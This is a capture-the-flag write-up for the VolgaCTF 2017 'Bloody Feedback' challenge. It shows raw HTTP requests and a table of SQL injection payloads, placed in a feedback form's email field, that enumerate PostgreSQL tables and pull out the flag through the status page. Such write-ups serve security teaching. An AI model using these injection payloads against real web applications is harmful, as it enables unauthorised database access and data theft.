---
layout: page
title: "VolgaCTF 2017 Quals Writeup: Bloody Feedback"
---

> Bloody Feedback
>
> 100
> 
> Send your feedback at bloody-feedback.quals.2017.volgactf.ru
> 
> DO. NOT. USE. SQLMAP
> Otherwise your IP will be banned

The Web site has functionality to submit messages and view their status. After some exploring we see that there is SQL injection on the e-mail parameter:

```http
POST /submit/ HTTP/1.1
Host: bloody-feedback.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://bloody-feedback.quals.2017.volgactf.ru/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

name=x&email=x%40x.com'&message=x
```
```http
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html
Date: Sat, 25 Mar 2017 15:34:09 GMT
Server: nginx/1.10.0 (Ubuntu)

<!DOCTYPE html>
<html lang="en">
    <link href="../static/css/bootstrap.css" rel="stylesheet">
        <script src="../static/js/jquery-3.1.1.js"></script>  
        <script src="../static/js/bootstrap.js"></script>

...		
            
                <p>ERROR: DBD::Pg::db do failed: ERROR:  syntax error at or near "not"
LINE 1: ...QSWS7o838iMteRdzVj','x','x','x@x.com'','not proces...
                                                   ^ at Worker.pm line 29.

</p>
            </div>
        </div>
        
    </body>
</html>
```

We can exploit it by submitting a test string...

```http
POST /submit/ HTTP/1.1
Host: bloody-feedback.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://bloody-feedback.quals.2017.volgactf.ru/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

name=x&email=x%40x.com','test')--&message=x
```
```http
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html
Date: Sat, 25 Mar 2017 15:39:52 GMT
Server: nginx/1.10.0 (Ubuntu)

...
            
                <p><h3>Check status</h3><a href='/check/?code=sdBw1759uMtSW9kBD1RwspwVFXahzNiC'>sdBw1759uMtSW9kBD1RwspwVFXahzNiC</a></p>
            </div>
        </div>
        
    </body>
</html>
```

...and have it displayed in the status:

```http
GET /check/?code=sdBw1759uMtSW9kBD1RwspwVFXahzNiC HTTP/1.1
Host: bloody-feedback.quals.2017.volgactf.ru
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://bloody-feedback.quals.2017.volgactf.ru/submit/
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html
Date: Sat, 25 Mar 2017 15:40:11 GMT
Server: nginx/1.10.0 (Ubuntu)

...            
                <p><h3>Your message status is <span class="label label-info">test</span></h3></p>
            </div>
        </div>
        
    </body>
</html>
```

This will be our way to exfiltrate the data from the database - we will inject SQL into the status field and then check the status page to see the value. We also will have to be mindful of the fact that the status field is 30 characters long, so we will have to adjust the data we put into it to account for that.

Here are the injected SQL snippets that we put into the ```email``` parameter and their results from the status page:

**SQL snippet**|**Result**
-----------|------
```x%40x.com',substring(version(),0,30))--```|```PostgreSQL 9.5.6 on x86_64-pc```
```x%40x.com',(SELECT count(*) FROM pg_catalog.pg_tables WHERE schemaname <> 'pg_catalog' AND schemaname <> 'information_schema';))--```|```2```
```x%40x.com',(SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname <> 'pg_catalog' AND schemaname <> 'information_schema' limit 1;))--```|```messages```
```x%40x.com',(SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname <> 'pg_catalog' AND schemaname <> 'information_schema' limit 1 offset 1;))--```|```s3cret_tabl3```
```x%40x.com',(select column_name from information_schema.columns where table_name like 's3cret_tabl3%' limit 1;))--```|```s3cr3tc0lumn```
```x%40x.com',(SELECT substring(string_agg(s3cr3tc0lumn, ','),0,30) FROM s3cret_tabl3;))--```|```FLAG1,VolgaCTF,Volga,1,VolgaC```
```x%40x.com',(SELECT substring(string_agg(s3cr3tc0lumn, ','),30,30) FROM s3cret_tabl3;))--```|```TF{eiU7UJhyeu@ud3*},volgavolga```

The flag is ```VolgaCTF{eiU7UJhyeu@ud3*}```.